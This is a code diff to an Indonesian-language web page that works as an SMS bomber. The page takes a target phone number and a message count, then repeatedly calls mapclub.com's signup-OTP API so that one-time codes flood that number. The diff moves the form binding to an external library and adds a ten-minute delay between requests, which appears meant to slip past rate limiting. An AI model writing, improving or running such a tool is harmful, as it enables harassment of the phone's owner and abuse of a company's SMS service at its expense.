@@ -10,15 +10,15 @@
 
     <div class="mb-3">
         <label for="exampleFormControlInput1" class="form-label">Nomor Telpon</label>
-        <input type="text" name="phone" input-cuk="phone" class="form-control" />
+        <input type="text" name="phone" vy-input="phone" class="form-control" />
     </div>
     <div class="mb-3">
         <label for="exampleFormControlInput1" class="form-label">Jumlah Sms</label>
-        <input type="number" name="jumlah" input-cuk="amount" class="form-control" />
+        <input type="number" name="jumlah" vy-input="amount" class="form-control" />
     </div>
-    <select class="form-select mb-3" name="opsi" select-cuk="optional" aria-label="Default select example">
+    <select class="form-select mb-3" name="opsi" vy-input="optional" aria-label="Default select example">
         <option >Pilih server</option>
-        <option  value="1">Mapcup</option>
+        <option  value="1">Mapcup (Send every 10 minute)</option>
       </select>
     <div class="text-center"><button onClick="senderFunc()" class="btn btn-primary btn-lg"  >Submit</button></div>
 </div>
@@ -26,42 +26,17 @@
 </html>
 
 <script src="https://unpkg.com/nprogress@0.2.0/nprogress.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/mrtampan/vyvy/vyvy.js"></script>
 <link rel='stylesheet' href='https://unpkg.com/nprogress@0.2.0/nprogress.css'/>
 <script>
 
-// create data input binding
-var attributInput = 'input-cuk';
-var attributSelect = 'select-cuk';
-var elInput = document.querySelectorAll('[' + attributInput + ']'),
-elSelect = document.querySelectorAll('[' + attributSelect + ']'),
-dataState = {};
-    
-elInput.forEach(function(elemen){
-    if(elemen.type == 'text' || elemen.type == 'textarea' || elemen.type == 'number'){
-        let propertiesToBind = elemen.getAttribute(attributInput);
-        elemen.onkeyup = function(){
-            dataState[propertiesToBind] = elemen.value;
-        }
-    }
-})
 
-elSelect.forEach(function(elemen){
-    if(elemen.type == 'select-one'){
-        let propertiesToBind = elemen.getAttribute(attributSelect);
-        elemen.onchange = function(){
-            dataState[propertiesToBind] = elemen.value;
-        }
-    }
-})
-
-
-    console.log(dataState);
-
-function mapclub(){
+const timer = ms => new Promise(res => setTimeout(res, ms))
+async function mapclub(){
     let formData = new FormData;
-    formData.append('phone', dataState.phone);
+    formData.append('phone', vyData.phone);
     NProgress.start();
-    for(let i = 0; i < parseInt(dataState.amount); i++){
+    for(let i = 0; i < parseInt(vyData.amount); i++){
             console.log("gass");
             fetch('https://cmsapi.mapclub.com/api/signup-otp', {
             method: 'POST',
@@ -70,43 +45,42 @@ function mapclub(){
             .then((response) => response.json())
             .then((result) => {
                 console.log(result);
-                setTimeout(() => {
-                    //
-                }, 10000);
             })
             .catch((error) => {
                 console.error('Error:', error);
                 alert("Error");
             });
-
+            await timer(600000);
     }
     NProgress.done();
     alert("sukses");
 }
 
+
 function senderFunc(){
     
-    if(dataState.phone == '' || dataState.phone == null || dataState.phone == undefined){
+    if(vyData.phone == '' || vyData.phone == null || vyData.phone == undefined){
         alert("nomor telpon tidak boleh kosong");
         return '';
     }
-    if(dataState.amount == '' || dataState.amount == null){
+    if(vyData.amount == '' || vyData.amount == null){
         alert("jumlah tidak boleh kosong");
         return '';       
     }
 
-    if(dataState.optional == null || dataState.optional == ''){
+    if(vyData.optional == null || vyData.optional == ''){
         alert("Pilih servernya pak");
         return '';         
     }
 
-    if(dataState.optional == "1"){
+    if(vyData.optional == "1"){
         mapclub();
-    }
-    
-    
+    }  
+  
 
 }
+
+vyInit();
 
 
 
